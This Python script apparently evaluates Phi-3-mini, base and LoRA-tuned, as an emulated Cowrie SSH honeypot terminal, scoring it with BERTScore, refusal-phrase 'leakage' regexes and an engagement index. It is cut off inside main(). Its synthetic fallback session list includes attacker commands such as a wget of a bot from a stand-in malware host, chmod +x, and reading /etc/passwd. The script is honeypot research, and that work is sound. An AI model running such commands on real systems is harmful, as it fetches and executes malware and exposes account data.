"""
evaluate_phi3_cowrie_v3.py
──────────────────────────────────────────────────────────────────────────────
İKİ KOŞULLU DENEYSEL TASARIM — ABLATION STUDY
─────────────────────────────────────────
Akademik karşılaştırma (ablation study) için iki koşul üretilir:

  KOŞUL 0 — BASE MODEL
    Phi-3-mini-4k-instruct, LoRA adaptörü YOK.
    Doğal halüsinasyonlar gözlemlenir (enjeksiyon yok).

  KOŞUL 1 — LoRA FINE-TUNED
    Phi-3-mini-4k-instruct + phi3-cowrie-lora adaptörü.
    Cowrie SSH honeypot verileriyle ince-ayar yapılmış model.

Her koşul için bağımsız olarak hesaplanır:
  - BERTScore (precision, recall, F1)
  - Hallucination rate (semantic + leakage)
  - Cowrie Fidelity (role adherence)
  - AEI Tutunma Çarpanı (LLM Dur / Cowrie Dur)

──────────────────────────────────────────────────────────────────────────────
OPTİMİZASYONLAR
  - Batch generation (truncation YOK)
  - Batch BERTScore
  - AI Leakage Cezası (Sızıntı yakalanırsa Quality = 0.0)
  - Her koşul için bağımsız model yükleme (4-bit quantisation)
──────────────────────────────────────────────────────────────────────────────
"""

import json
import random
import re
import time
import warnings
from pathlib import Path

import torch
from bert_score import score as bert_score_fn
from peft import PeftModel
from tqdm.auto import tqdm
from transformers import AutoModelForCausalLM, AutoTokenizer, BitsAndBytesConfig

warnings.filterwarnings("ignore", category=UserWarning)

# ═══════════════════════════════════════════════════════════════════════════
#  PATHS
# ═══════════════════════════════════════════════════════════════════════════

BASE_DIR     = Path(__file__).resolve().parent
MODEL_NAME   = "microsoft/Phi-3-mini-4k-instruct"
ADAPTER_PATH = str(BASE_DIR / "phi3-cowrie-lora-adapter")
DATASET_PATH = str(BASE_DIR / "combined_finetune_dataset.jsonl")
CSV_PATH     = str(BASE_DIR.parent / "Processed_Data.csv")
OUTPUT_JSON  = str(BASE_DIR / "llm_evaluation_results_v3.json")

_DRIVE_BASE = Path("/content/drive/MyDrive")
_DRIVE_CKPT = _DRIVE_BASE / "phi3_eval_checkpoints_v3"
_LOCAL_CKPT = Path("/content/checkpoints_v3")

if _DRIVE_BASE.exists():
    CKPT_DIR = _DRIVE_CKPT
    HF_CACHE_DIR = str(_DRIVE_BASE / "hf_cache")
else:
    CKPT_DIR = _LOCAL_CKPT
    HF_CACHE_DIR = None

CKPT_DIR.mkdir(parents=True, exist_ok=True)
if HF_CACHE_DIR:
    Path(HF_CACHE_DIR).mkdir(parents=True, exist_ok=True)

# ═══════════════════════════════════════════════════════════════════════════
#  HYPERPARAMETERS
# ═══════════════════════════════════════════════════════════════════════════

# Tek eşik — rescale_with_baseline=True ile CodeBERT F1 ~[0.0, 0.7] bandına iner.
# F1 >= THRESHOLD → faithful / clean
# F1 <  THRESHOLD → semantic hallucination
# Gri bölge yok: her örnek kesin olarak bir kategoride.
# İlk çalıştırma sonrası dağılımı görüp 0.40–0.50 arasında ayarlayın.
THRESHOLD               = 0.45
HALLUCINATION_THRESHOLD = THRESHOLD
CONSISTENCY_THRESHOLD   = THRESHOLD

ENGAGEMENT_FACTOR  = 0.20   # Artık kullanılmıyor — AEI direkt quality çarpanı kullanır
AEI_SESSION_SAMPLE = 999_999
SEED               = 42
MAX_NEW_TOKENS     = 128
TEMPERATURE        = 0.1
DO_SAMPLE          = True
BATCH_SIZE         = 4        # A100/V100→32, T4→8
CSV_CHUNK_SIZE     = 500_000

# ── Deneysel koşullar ────────────────────────────────────────────────────
CONDITIONS = ["base_model", "lora_finetuned", "lora_finetuned_domain_roberta", "lora_hallucinated_prompt"]

# ═══════════════════════════════════════════════════════════════════════════
#  LEAKAGE REGEX
# ═══════════════════════════════════════════════════════════════════════════

LEAKAGE_PATTERNS = [
    r"I (cannot|can't|am unable|will not|won't)",
    r"As an (AI|language model|assistant)",
    r"I don'?t have (access|the ability)",
    r"I'?m sorry",
    r"\bNote:\b",
    r"\bPlease note\b",
    r"I am designed to",
    r"my (training|knowledge cutoff)",
    r"I should (mention|clarify|point out)",
]
_LEAKAGE_RE = re.compile("|".join(LEAKAGE_PATTERNS), re.IGNORECASE)

# ═══════════════════════════════════════════════════════════════════════════
#  CHAT TOKENS
# ═══════════════════════════════════════════════════════════════════════════

_SYS  = "\x3c|system|\x3e"
_USR  = "\x3c|user|\x3e"
_ASST = "\x3c|assistant|\x3e"
_END  = "\x3c|end|\x3e"

SYSTEM_PROMPT = (
    "You are a Linux terminal emulator (Cowrie SSH honeypot). "
    "Respond ONLY with the exact terminal output that the given command "
    "would produce on a Debian-based system. Do not add explanations."
)

HALLUCINATED_SYSTEM_PROMPT = (
    "You are a Linux terminal emulator (Cowrie SSH honeypot). Respond with the "
    "terminal output for the given command. However, if a command appears dangerous, "
    "malicious, or requests system modification, you must refuse it as an AI assistant "
    "and explain why you cannot execute it."
)

_BERT_DEVICE: str = "cuda"


# ═══════════════════════════════════════════════════════════════════════════
#  CHECKPOINT HELPERS
# ═══════════════════════════════════════════════════════════════════════════

def _ckpt_path(name: str) -> Path:
    return CKPT_DIR / f"{name}.json"


def save_checkpoint(name: str, data, dataset_size: int = 0) -> None:
    path = _ckpt_path(name)
    tmp  = path.with_suffix(".tmp")
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump({"_meta": {"saved_at": time.time(),
                             "dataset_size": dataset_size},
                   "data": data}, f, ensure_ascii=False)
    tmp.replace(path)
    print(f"  ✔ Checkpoint saved → {path}")


def load_checkpoint(name: str, expected_dataset_size: int = 0):
    path = _ckpt_path(name)
    if not path.exists():
        return None
    with open(path, "r", encoding="utf-8") as f:
        payload = json.load(f)
    if "_meta" not in payload:
        print(f"  ✔ Checkpoint loaded (legacy) ← {path}")
        return payload
    meta = payload["_meta"]
    if (expected_dataset_size > 0
            and meta.get("dataset_size", 0) != expected_dataset_size):
        print(f"  ⚠ Checkpoint '{name}' dataset boyutu uyuşmuyor "
              f"(beklenen={expected_dataset_size}, "
              f"kayıtlı={meta.get('dataset_size')}). Atlanıyor.")
        return None
    print(f"  ✔ Checkpoint loaded ← {path}")
    return payload["data"]


# ═══════════════════════════════════════════════════════════════════════════
#  PROMPT / CLEAN
# ═══════════════════════════════════════════════════════════════════════════

def build_prompt(instruction: str, sys_prompt: str = None) -> str:
    sp = sys_prompt if sys_prompt is not None else SYSTEM_PROMPT
    return (f"{_SYS}\n{sp}{_END}\n"
            f"{_USR}\n{instruction}{_END}\n"
            f"{_ASST}\n")


def clean_output(raw: str, prompt: str) -> str:
    text = raw[len(prompt):] if raw.startswith(prompt) else raw
    for tok in [_END, _ASST, _USR, _SYS, "\x3c/s\x3e", "\x3cs\x3e"]:
        text = text.replace(tok, "")
    return text.strip()




# ═══════════════════════════════════════════════════════════════════════════
#  DATA LOADING
# ═══════════════════════════════════════════════════════════════════════════

def load_jsonl(path: str) -> list:
    rows = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line:
                rows.append(json.loads(line))
    return rows


def load_cowrie_sessions(csv_path: str, max_sessions: int = 999_999) -> list:
    try:
        import pandas as pd
    except ImportError:
        print("  [WARN] pandas yok — fallback sessions.")
        return _fallback_sessions(50)

    sessions_map: dict = {}
    try:
        reader = pd.read_csv(
            csv_path,
            usecols=["source_cowrie", "event_type", "session_id",
                     "session_duration", "request_data"],
            low_memory=False,
            chunksize=CSV_CHUNK_SIZE,
        )
        for chunk in tqdm(reader, desc="  Reading CSV chunks", unit="chunk"):
            cowrie   = chunk[chunk["source_cowrie"] == 1]
            cmd_mask = cowrie["event_type"].str.contains(
                "command", case=False, na=False)
            cmd_rows = cowrie[cmd_mask].dropna(
                subset=["request_data", "session_id"])
            for _, row in cmd_rows.iterrows():
                sid = str(row["session_id"])
                if sid not in sessions_map:
                    sessions_map[sid] = {
                        "session_id": sid,
                        "duration":   float(row["session_duration"])
                                      if row["session_duration"] > 0 else -1,
                        "commands":   [],
                    }
                if len(sessions_map[sid]["commands"]) < 10:
                    sessions_map[sid]["commands"].append(
                        str(row["request_data"]).strip())
    except Exception as e:
        print(f"  [WARN] CSV okunamadı ({e}) — fallback sessions.")
        return _fallback_sessions(50)

    sessions = [
        {**s, "cmd_count": len(s["commands"])}
        for s in sessions_map.values()
        if len(s["commands"]) >= 1 and s["duration"] > 0
    ]
    if not sessions:
        return _fallback_sessions(50)
    random.shuffle(sessions)
    return sessions[:max_sessions]


def _fallback_sessions(n: int) -> list:
    cmds = ["uname -a", "cat /etc/passwd", "whoami", "id", "w",
            "ls -la /", "ps -ef", "ifconfig", "cat /proc/cpuinfo",
            "wget http://malware.example.com/bot", "chmod +x bot",
            "hostname", "df -h", "free -m", "netstat -tulpn"]
    sessions = []
    for i in range(n):
        k = random.randint(1, 8)
        sessions.append({"session_id": f"synthetic_{i:04d}", "cmd_count": k,
                         "duration": random.uniform(0.5, 15.0),
                         "commands": random.sample(cmds, min(k, len(cmds)))})
    return sessions


# ═══════════════════════════════════════════════════════════════════════════
#  GENERATION  (batch — truncation YOK)
# ═══════════════════════════════════════════════════════════════════════════

@torch.no_grad()
def generate_batch(model, tokenizer, prompts: list, device: str) -> list:
    enc = tokenizer(prompts, return_tensors="pt", padding=True, truncation=True, max_length=3072).to(device)
    input_length = enc["input_ids"].shape[1]
    
    out = model.generate(
        input_ids=enc["input_ids"],
        attention_mask=enc["attention_mask"],
        max_new_tokens=MAX_NEW_TOKENS,
        temperature=TEMPERATURE, 
        do_sample=DO_SAMPLE,
        pad_token_id=tokenizer.pad_token_id,
        eos_token_id=tokenizer.eos_token_id,
    )
    
    # Slice off the input prompt
    new_tokens = out[:, input_length:]
    
    # Decode only the generated tokens
    decoded = tokenizer.batch_decode(new_tokens, skip_special_tokens=True)
    
    return [clean_output(txt, "") for txt in decoded]


# ═══════════════════════════════════════════════════════════════════════════
#  BERTSCORE  (boş yanıt filtreli)
# ═══════════════════════════════════════════════════════════════════════════

def has_leakage(text: str) -> bool:
    return bool(_LEAKAGE_RE.search(text))


def compute_bertscore(references: list, hypotheses: list, bert_model_path: str = "/content/drive/MyDrive/roberta-large") -> dict:
    """
    Boş yanıtları filtreler, F1=0.0 atar — ortalamayi kirletmez.
    """
    n          = len(hypotheses)
    p_full     = [0.0] * n
    r_full     = [0.0] * n
    f1_full    = [0.0] * n
    valid_idx  = [i for i, h in enumerate(hypotheses) if h]

    if valid_idx:
        P_v, R_v, F1_v = bert_score_fn(
            [hypotheses[i] for i in valid_idx],
            [references[i] for i in valid_idx],
            model_type=bert_model_path, num_layers=17, verbose=False, lang="en", device=_BERT_DEVICE,
            rescale_with_baseline=True,
        )
        for pos, orig in enumerate(valid_idx):
            p_full[orig]  = P_v[pos].item()
            r_full[orig]  = R_v[pos].item()
            f1_full[orig] = F1_v[pos].item()

    skipped = n - len(valid_idx)
    if skipped:
        print(f"  ⚠ {skipped} boş yanıt BERTScore'dan çıkarıldı (F1=0.0).")

    return {
        "precision":     sum(p_full)  / n if n else 0.0,
        "recall":        sum(r_full)  / n if n else 0.0,
        "f1":            sum(f1_full) / n if n else 0.0,
        "per_sample_f1": f1_full,
    }


def bertscore_subset(per_f1: list, indices: list) -> dict:
    if not indices:
        return {"f1": 0.0, "n": 0}
    vals = [per_f1[i] for i in indices]
    return {"f1": round(sum(vals) / len(vals), 4), "n": len(vals)}


# ═══════════════════════════════════════════════════════════════════════════
#  HALLUCINATION / CONSISTENCY
# ═══════════════════════════════════════════════════════════════════════════

def compute_hallucination(hypotheses: list, per_f1: list,
                           threshold: float) -> dict:
    sem_fail  = [i for i, f in enumerate(per_f1)       if f < threshold]
    leak_fail = [i for i, h in enumerate(hypotheses)   if has_leakage(h)]
    hall_idx  = sorted(set(sem_fail) | set(leak_fail))
    clean_idx = [i for i in range(len(hypotheses)) if i not in set(hall_idx)]
    n = len(hypotheses)
    return {
        "bert_threshold":             threshold,
        "total_samples":              n,
        "semantic_failures":          len(sem_fail),
        "leakage_failures":           len(leak_fail),
        "hallucinated_count":         len(hall_idx),
        "clean_count":                len(clean_idx),
        "hallucination_rate_pct":     round(len(hall_idx) / n * 100, 2) if n else 0.0,
        "semantic_hallucination_pct": round(len(sem_fail)  / n * 100, 2) if n else 0.0,
        "leakage_hallucination_pct":  round(len(leak_fail) / n * 100, 2) if n else 0.0,
        "hallucinated_indices":       hall_idx,
        "clean_indices":              clean_idx,
    }


def compute_fidelity(per_f1: list, hypotheses: list, threshold: float) -> dict:
    """
    Cowrie Fidelity: LLM yanıtının Cowrie referans çıktısına ne kadar
    yakın olduğunu ölçer. 'Consistency' değil — Cowrie'ye uyum (role adherence).
    """
    faithful = sum(1 for f, h in zip(per_f1, hypotheses) if f >= threshold and not has_leakage(h))
    n         = len(per_f1)
    return {
        "threshold":             threshold,
        "faithful_samples":      faithful,
        "unfaithful_samples":    n - faithful,
        "total_samples":         n,
        "fidelity_rate_pct":     round(faithful / n * 100, 2) if n else 0.0,
    }


# ═══════════════════════════════════════════════════════════════════════════
#  AEI
# ═══════════════════════════════════════════════════════════════════════════

def _aei_aggregate(session_results: list) -> dict:
    if not session_results:
        return {"session_count": 0, "aei_mean": 0.0, "aei_median": 0.0}
    aei_v  = [s["aei"]               for s in session_results]
    qual_v = [s["avg_quality_score"] for s in session_results]
    dcmd_v = [s["delta_commands"]    for s in session_results]
    ddur_v = [s["delta_duration"]    for s in session_results]
    n      = len(aei_v)
    s_aei  = sorted(aei_v)
    med    = s_aei[n//2] if n % 2 else (s_aei[n//2-1] + s_aei[n//2]) / 2
    tc = sum(s["cowrie_cmd_count"] for s in session_results)
    tl = sum(s["llm_cmd_count"]    for s in session_results)
    td = sum(s["cowrie_duration"]  for s in session_results)
    ld = sum(s["llm_duration"]     for s in session_results)
    return {
        "session_count":             n,
        "aei_mean":                  round(sum(aei_v) / n,   4),
        "aei_median":                round(med,               4),
        "aei_min":                   round(min(aei_v),        4),
        "aei_max":                   round(max(aei_v),        4),
        "avg_quality_score":         round(sum(qual_v) / n,   4),
        "avg_delta_commands":        round(sum(dcmd_v) / n,   2),
        "avg_delta_duration":        round(sum(ddur_v) / n,   3),
        "total_cowrie_commands":     tc,
        "total_llm_commands":        round(tl, 2),
        "total_cowrie_duration_sec": round(td, 2),
        "total_llm_duration_sec":    round(ld, 2),
        "command_increase_pct":      round((tl - tc) / max(tc, 1)    * 100, 2),
        "duration_increase_pct":     round((ld - td) / max(td, 0.01) * 100, 2),
    }


def compute_aei_for_condition(
    model, tokenizer, device: str,
    gt_data: list,
    cowrie_sessions: list,
    condition_hypotheses: list,
    instructions: list,
    dataset_size: int,
    condition_name: str,
    bert_model_path: str = "/content/drive/MyDrive/roberta-large",
) -> tuple:
    """
    Bir koşul için AEI hesaplar.
    """
    cmd_lookup   = {e["instruction"].strip(): e["output"].strip()
                    for e in gt_data
                    if e.get("instruction") and e.get("output")}

    # Bu koşulda hangi instruction'lar leakage içeriyor?
    instr_to_hyp = dict(zip(instructions, condition_hypotheses))
    hall_cmds    = {instr for instr, hyp in instr_to_hyp.items()
                    if has_leakage(hyp)}
    hall_sids    = {s["session_id"] for s in cowrie_sessions
                    if any(cmd in hall_cmds for cmd in s["commands"])}

    ckpt_name = f"aei_base_{condition_name}"
    ckpt      = load_checkpoint(ckpt_name, expected_dataset_size=dataset_size)

    if ckpt is not None:
        per_session_base = ckpt
        print(f"  [{condition_name}] AEI base resumed: "
              f"{len(per_session_base)} sessions")
    else:
        # ── Adım 1: prompt & ref topla ──────────────────────────────────
        print(f"\n  [{condition_name}] {len(cowrie_sessions)} session "
              f"işleniyor (batch BERTScore)...")

        session_meta:    list = []
        pending_prompts: list = []
        pending_refs:    list = []

        sys_prompt = HALLUCINATED_SYSTEM_PROMPT if condition_name == "lora_hallucinated_prompt" else SYSTEM_PROMPT
        for session in tqdm(cowrie_sessions,
                            desc=f"  [{condition_name}] Collecting",
                            unit="session"):
            has_match = any(cmd in cmd_lookup for cmd in session["commands"])
            meta = {
                "session_id":       session["session_id"],
                "cowrie_cmd_count": session["cmd_count"],
                "cowrie_duration":  session["duration"],
                "is_hallucinated":  session["session_id"] in hall_sids,
                "items":            [],
                "skip":             not has_match,
            }
            session_meta.append(meta)
            if not has_match:
                continue

            for cmd in session["commands"]:
                ref = cmd_lookup.get(cmd)
                if ref is None:
                    continue
                existing_hyp = instr_to_hyp.get(cmd)
                if existing_hyp is not None:
                    meta["items"].append(("direct", existing_hyp, ref))
                else:
                    p_idx = len(pending_prompts)
                    pending_prompts.append(build_prompt(cmd, sys_prompt=sys_prompt))
                    pending_refs.append(ref)
                    meta["items"].append(("gen", p_idx))

        # ── Adım 2: Dataset dışı komutlar için generation ───────────────
        SAVE_EVERY    = 500
        gen_ckpt_name = f"aei_partial_{condition_name}"
        gen_ckpt      = load_checkpoint(gen_ckpt_name,
                                        expected_dataset_size=dataset_size)
        if (gen_ckpt and isinstance(gen_ckpt, dict)
                and gen_ckpt.get("total") == len(pending_prompts)):
            extra_hyps = gen_ckpt["hyps"]
            start_idx  = len(extra_hyps)
            print(f"  [{condition_name}] Extra gen resumed: "
                  f"{start_idx}/{len(pending_prompts)}")
        else:
            extra_hyps = []
            start_idx  = 0

        if pending_prompts:
            for b_start in tqdm(
                range(start_idx, len(pending_prompts), BATCH_SIZE),
                desc=f"  [{condition_name}] Extra gen", unit="batch",
            ):
                batch = pending_prompts[b_start: b_start + BATCH_SIZE]
                extra_hyps.extend(
                    generate_batch(model, tokenizer, batch, device))
                if len(extra_hyps) % SAVE_EVERY < BATCH_SIZE:
                    save_checkpoint(gen_ckpt_name,
                                    {"hyps": extra_hyps,
                                     "total": len(pending_prompts)},
                                    dataset_size=dataset_size)

        # ── Adım 3: Tüm (hyp, ref) çiftlerini düzleştir ─────────────────
        all_hyps_flat: list = []
        all_refs_flat: list = []
        ptr_map:       list = []

        for s_meta in session_meta:
            ptrs = []
            for item in s_meta["items"]:
                if item[0] == "direct":
                    h, r = item[1], item[2]
                else:
                    p_idx = item[1]
                    h = extra_hyps[p_idx] if p_idx < len(extra_hyps) else ""
                    r = pending_refs[p_idx]
                all_hyps_flat.append(h)
                all_refs_flat.append(r)
                ptrs.append(len(all_hyps_flat) - 1)
            ptr_map.append(ptrs)

        # ── Adım 4: Toplu BERTScore (boş yanıt filtreli + CHUNK YENİ) ───
        print(f"\n  [{condition_name}] BERTScore "
              f"({len(all_hyps_flat)} komut, bulk)...")
        f1_scores: list = [None] * len(all_hyps_flat)
        valid_list = [i for i, h in enumerate(all_hyps_flat) if h]

        if valid_list:
            bert_ckpt_name = f"aei_bulk_bertscore_{condition_name}"
            bert_ckpt = load_checkpoint(bert_ckpt_name, expected_dataset_size=dataset_size)
            
            F1_bulk_items = []
            if bert_ckpt and isinstance(bert_ckpt, dict) and bert_ckpt.get("total") == len(valid_list):
                F1_bulk_items = bert_ckpt["f1_scores"]
                print(f"  [{condition_name}] Bulk BERTScore resumed: {len(F1_bulk_items)}/{len(valid_list)}")
            
            start_idx = len(F1_bulk_items)
            if start_idx < len(valid_list):
                CHUNK_SIZE = 1000  
                for b_start in tqdm(
                    range(start_idx, len(valid_list), CHUNK_SIZE),
                    desc=f"  [{condition_name}] Bulk BERT", unit="chunk"
                ):
                    chunk_idx = valid_list[b_start : b_start + CHUNK_SIZE]
                    _, _, F1_chunk = bert_score_fn(
                        [all_hyps_flat[i] for i in chunk_idx],
                        [all_refs_flat[i] for i in chunk_idx],
                        model_type=bert_model_path, num_layers=17, verbose=False, lang="en", device=_BERT_DEVICE,
                        rescale_with_baseline=True,
                    )
                    F1_bulk_items.extend([f.item() for f in F1_chunk])
                    
                    save_checkpoint(bert_ckpt_name, {
                        "f1_scores": F1_bulk_items,
                        "total": len(valid_list)
                    }, dataset_size=dataset_size)

            for pos, orig in enumerate(valid_list):
                f1_scores[orig] = F1_bulk_items[pos]

        skipped = len(all_hyps_flat) - len(valid_list)
        if skipped:
            print(f"  ⚠ [{condition_name}] {skipped} boş yanıt "
                  f"quality hesabından çıkarıldı.")

        # ── Adım 5: Session bazlı quality ortalaması ─────────────────────
        per_session_base = []
        for s_meta, ptrs in zip(session_meta, ptr_map):
            if s_meta["skip"]:
                continue
            
            q_scores = []
            for p in ptrs:
                if p < len(f1_scores) and f1_scores[p] is not None:
                    # DÜZELTME: Eğer yanıt "AI Leakage" içeriyorsa, BERTScore
                    # yüksek bile olsa o komutun kalitesi simülasyon için 0'dır.
                    if has_leakage(all_hyps_flat[p]):
                        q_scores.append(0.0)
                    else:
                        q_scores.append(f1_scores[p])
                        
            if not q_scores:
                continue
            avg_q        = sum(q_scores) / len(q_scores)
            cc           = s_meta["cowrie_cmd_count"]
            dur          = s_meta["cowrie_duration"]
            per_session_base.append({
                "session_id":       s_meta["session_id"],
                "cowrie_cmd_count": cc,
                "cowrie_duration":  dur,
                "avg_quality":      avg_q,
                "avg_interval":     dur / cc if cc else 1.0,
                "is_hallucinated":  s_meta["is_hallucinated"],
            })

        save_checkpoint(ckpt_name, per_session_base, dataset_size=dataset_size)

    # ── AEI Hesaplama ────────────────────────────────────────────────────
    # llm_cmd_count = cowrie_cmd_count * (1 + avg_quality)
    # Mantık: quality=1.0 → saldırgan Cowrie'deki kadar EK komut girer (2x),
    #         quality=0.0 → LLM hiç fark yaratmaz (AEI=1.0),
    #         quality=0.5 → %50 daha fazla komut (AEI=1.5)
    all_r = []; hall_r = []; clean_r = []
    
    for s in per_session_base:
        q            = s["avg_quality"]          # rescaled BERTScore F1 ∈ [0,1]
        llm_cmd      = s["cowrie_cmd_count"] * (1.0 + q)
        llm_dur      = llm_cmd * s["avg_interval"]
        d_cmd        = llm_cmd - s["cowrie_cmd_count"]
        d_dur        = llm_dur - s["cowrie_duration"]
        
        # AEI = LLM Süresi / Cowrie Süresi (Tutunma Çarpanı)
        # quality=0 → AEI=1.0 (fark yok), quality=1 → AEI=2.0 (2x daha uzun)
        aei = (llm_dur / s["cowrie_duration"]) if s["cowrie_duration"] > 0 else 1.0
        
        row = {
            "session_id":        s["session_id"],
            "cowrie_cmd_count":  s["cowrie_cmd_count"],
            "cowrie_duration":   round(s["cowrie_duration"], 3),
            "llm_cmd_count":     round(llm_cmd, 2),
            "llm_duration":      round(llm_dur, 3),
            "avg_quality_score": round(s["avg_quality"], 4),
            "delta_commands":    round(d_cmd, 2),
            "delta_duration":    round(d_dur, 3),
            "aei":               round(aei, 4),
        }
        all_r.append(row)
        (hall_r if s["is_hallucinated"] else clean_r).append(row)

    fk = "aei"
    aei_sens = {fk: _aei_aggregate(all_r)}
    aei_sub  = {fk: {
        "with_hallucination":    _aei_aggregate(hall_r),
        "without_hallucination": _aei_aggregate(clean_r),
    }}

    return aei_sens, aei_sub, per_session_base


# ═══════════════════════════════════════════════════════════════════════════
#  PRINT HELPERS
# ═══════════════════════════════════════════════════════════════════════════

def hline(char="=", width=80): print(char * width)
def section(title):            print(); hline(); print(f"  {title}"); hline()
def kv(key, val, indent=2):    print(" " * indent + f"{key:<52s} {val}")


def print_condition_report(cname, bert, hall, fid,
                           aei_sens, aei_sub):
    label = {"base_model":     "KOŞUL 0 — BASE MODEL (adaptör yok)",
             "lora_finetuned": "KOŞUL 1 — LoRA FINE-TUNED"}.get(cname, cname)
    section(label)

    print("\n  A. BERTScore")
    print("  " + "-" * 72)
    kv("Precision  (overall)", f"{bert['precision']:.4f}")
    kv("Recall     (overall)", f"{bert['recall']:.4f}")
    kv("F1         (overall)", f"{bert['f1']:.4f}")

    print("\n  B. Hallucination")
    print("  " + "-" * 72)
    kv("Eşik (BERTScore F1 <)", f"{hall['bert_threshold']}")
    kv("Hallucinated",
       f"{hall['hallucinated_count']} / {hall['total_samples']}"
       f"  ({hall['hallucination_rate_pct']:.1f}%)")
    kv("  └─ Semantic failures",
       f"{hall['semantic_failures']}  ({hall['semantic_hallucination_pct']:.1f}%)")
    kv("  └─ Leakage failures",
       f"{hall['leakage_failures']}  ({hall['leakage_hallucination_pct']:.1f}%)")

    print("\n  C. Cowrie Fidelity  (Role Adherence — LLM yanıtı Cowrie'ye ne kadar uyuyor?)")
    print("  " + "-" * 72)
    kv("Faithful samples (F1 ≥ threshold)",
       f"{fid['faithful_samples']} / {fid['total_samples']}"
       f"  ({fid['fidelity_rate_pct']:.1f}%)")
    kv("Unfaithful samples",
       f"{fid['unfaithful_samples']}  ({100-fid['fidelity_rate_pct']:.1f}%)")

    print("\n  D. AEI Summary  (AEI = 1 + avg_quality,  range [1.0, 2.0])")
    print("  " + "-" * 72)
    print(f"  {'Sessions':>9} {'AEI Mean':>10} {'AEI Median':>11}"
          f" {'Cmd +%':>8} {'Dur +%':>8}")
    print("  " + "-" * 50)
    for fk, res in aei_sens.items():
        print(f"  {res['session_count']:>9}"
              f" {res['aei_mean']:>10.4f} {res['aei_median']:>11.4f}"
              f" {res['command_increase_pct']:>7.2f}%"
              f" {res['duration_increase_pct']:>7.2f}%")

    fk_ref  = "aei"
    sub     = aei_sub.get(fk_ref, {})
    w_hall  = sub.get("with_hallucination",    {})
    wo_hall = sub.get("without_hallucination", {})
    print(f"\n  AEI subset split (factor={fk_ref}):")
    kv("  without hallucination",
       f"{wo_hall.get('aei_mean', 'N/A')}"
       f"  (n={wo_hall.get('session_count', 0)} sessions)")
    kv("  with    hallucination",
       f"{w_hall.get('aei_mean', 'N/A')}"
       f"  (n={w_hall.get('session_count', 0)} sessions)")


def print_comparison_table(results: dict) -> None:
    section("KARŞILAŞTIRMA TABLOSU")
    names  = list(results.keys())
    labels = ["Base Model", "LoRA Fine-tuned", "LoRA + Domain RoBERTa"]

    header = f"  {'Metrik':<44s}"
    for l in labels:
        header += f"  {l:>14}"
    print(header)
    print("  " + "-" * (44 + 16 * len(names)))

    def row(metric, vals):
        print(f"  {metric:<44s}", end="")
        for v in vals:
            print(f"  {str(v):>14}", end="")
        print()

    row("BERTScore F1",
        [f"{results[n]['bertscore']['f1']:.4f}" for n in names])
    row("BERTScore Precision",
        [f"{results[n]['bertscore']['precision']:.4f}" for n in names])
    row("BERTScore Recall",
        [f"{results[n]['bertscore']['recall']:.4f}" for n in names])
    row("Hallucination Rate",
        [f"{results[n]['hallucination']['hallucination_rate_pct']:.1f}%" for n in names])
    row("  └─ Leakage failures",
        [str(results[n]['hallucination']['leakage_failures']) for n in names])
    row("  └─ Semantic failures",
        [str(results[n]['hallucination']['semantic_failures']) for n in names])
    row("Cowrie Fidelity Rate",
        [f"{results[n]['fidelity']['fidelity_rate_pct']:.1f}%" for n in names])

    fk_ref = "aei"
    row(f"AEI Mean",
        [f"{results[n]['aei_sensitivity'].get(fk_ref, {}).get('aei_mean', 'N/A')}"
         for n in names])
    row("  └─ AEI without halluc.",
        [f"{results[n]['aei_subsets'].get(fk_ref, {}).get('without_hallucination', {}).get('aei_mean', 'N/A')}"
         for n in names])
    row("  └─ AEI with    halluc.",
        [f"{results[n]['aei_subsets'].get(fk_ref, {}).get('with_hallucination', {}).get('aei_mean', 'N/A')}"
         for n in names])

    # Delta satırları
    def delta_row(label, key_path, fmt=".4f"):
        print(f"\n  {label}")
        if "base_model" not in results:
            return
        for cname in ["lora_finetuned", "lora_finetuned_domain_roberta"]:
            if cname not in results:
                continue
            def get_val(d, path):
                for k in path:
                    d = d.get(k, {}) if isinstance(d, dict) else {}
                return d if not isinstance(d, dict) else None

            b = get_val(results["base_model"], key_path)
            c = get_val(results[cname],        key_path)
            if b is not None and c is not None:
                try:
                    delta = float(c) - float(b)
                    sign  = "+" if delta >= 0 else ""
                    kv(f"  Δ {cname}", f"{sign}{delta:{fmt}}")
                except (TypeError, ValueError):
                    kv(f"  Δ {cname}", "N/A")

    print()
    delta_row("BERTScore F1 değişimi:",
              ["bertscore", "f1"])
    delta_row("Hallucination Rate değişimi (%):",
              ["hallucination", "hallucination_rate_pct"], fmt=".1f")
    delta_row("AEI Mean değişimi:",
              ["aei_sensitivity", "aei", "aei_mean"])
    print()


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════

def main():
    global _BERT_DEVICE
    random.seed(SEED)
    device       = "cuda"
    _BERT_DEVICE = device

    print(f"\n  Checkpoint directory : {CKPT_DIR}")
    print(f"  Device               : {device}")
    print(f"  Conditions           : {CONDITIONS}")

    # ── 1 / 3  Dataset ────────────────────────────────────────────────────
    section("1 / 3  Loading Dataset")

    gt_data    = load_jsonl(DATASET_PATH)
    gt_samples = gt_data
    ds_size    = len(gt_samples)
    print(f"  Dataset size: {ds_size} entries")

    # ── 2 / 3  Cowrie Sessions ────────────────────────────────────────────
    section("2 / 3  Loading Cowrie Sessions")
    print(f"  CSV: {CSV_PATH}")
    cowrie_sessions = load_cowrie_sessions(CSV_PATH, max_sessions=AEI_SESSION_SAMPLE)
    print(f"  {len(cowrie_sessions)} session yüklendi.")

    # ── 3 / 3  Per-Condition: Load → Generate → Evaluate ─────────────────
    section("3 / 3  Per-Condition Evaluation")

    all_results: dict = {}

    print(f"\n  [Global] Loading base model (FP16 mode)...")
    base_model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, 
        torch_dtype=torch.float16,
        device_map={"": 0},
        trust_remote_code=False,
        attn_implementation="eager",
        cache_dir=HF_CACHE_DIR,
    )

    tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME, trust_remote_code=False, cache_dir=HF_CACHE_DIR)
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token
    tokenizer.padding_side = "left"

    for cname in CONDITIONS:
        print(f"\n{'─'*80}")
        print(f"  ► {cname}")
        print(f"{'─'*80}")

        if cname == "lora_finetuned_domain_roberta":
            llm_cname = "lora_finetuned"
            bert_path = str(BASE_DIR / "roberta-cowrie-merged")
        elif cname == "lora_hallucinated_prompt":
            llm_cname = "lora_finetuned"
            bert_path = "/content/drive/MyDrive/roberta-large"
        else:
            llm_cname = cname
